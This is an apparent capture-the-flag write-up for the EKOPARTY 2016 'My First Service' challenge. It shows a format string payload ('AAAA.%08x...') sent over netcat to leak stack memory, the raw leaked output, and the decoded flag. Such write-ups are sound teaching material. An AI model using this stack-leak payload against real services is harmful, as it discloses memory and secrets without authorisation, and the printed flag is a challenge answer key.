---
layout: post
title: EKOPARTY CTF 2016 - My First Service (PWN 100)
date: 2016-10-29 12:10:00
categories: 
- CTF 
- EKOPARTY CTF 2016
---

## Challenge

> Blacky is taking his first steps at C programming for embedded systems, but he makes some mistakes. Retrieve the secret key for access.
> 
> nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000


## Solution

The challenge text gives a clue that this server may be running some sort of vulnerable program.  A typical session with the server might look like this:

```none
$ nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000
Welcome to my first service
Please input the secret key: 123abc
Invalid key: 123abc
```

My input was printed back to me.  This was an excellent opportunity to test for a format string vulnerability.  

The basis of this attack was to begin with 4 letter As __(AAAA)__, followed by a bunch of format string specifiers __(.%08x)__.  The As exist to help identify where the user input begins on the stack.  The format string specifiers, if there is a vulnerability, will actually read data off of the stack and print it.  This happens when the format string doesn't account for extra specifiers.  The format string modifiers have the form __.%08x__ in my attack, which means:

- the dot (__.__) merely helps to distinguish one chunk of data from the next
- the percent sign (__%__) signifies the beginning of a format string specifier
- the __08__ portion modifies this specifier such that it should print exactly 8 bytes of data, and if there are less than 8 bytes available, then it should be padded with zeros so that the output is always 8 bytes long
- the __x__ portion is the specifier for hexadecimal without a leading __0x__

```none
 
Please input the secret key: AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
Invalid key: AAAA.00000000.00000001.00000000.00000000.00000000.0000000a.00000000.454b4f7b.4c614269.67426566.3072647d.00000000.41414141.2e253038.782e2530.38782e25.3038782e.25303878.2e253038.782e2530.38782e25.3038782e
 
```

The vulnerability definitely existed, and the program returned some data off of the stack to me.  The interesting parts are:

`00000000.454b4f7b.4c614269.67426566.3072647d.00000000.41414141`

There are 32 bytes of data surrounded by null data, with my original __AAAA__ input beginning after the second null data.  After converting the 32 bytes of hex to ascii, I learned that it was the flag.


## Flag

```none
EKO{LaBigBef0rd}
```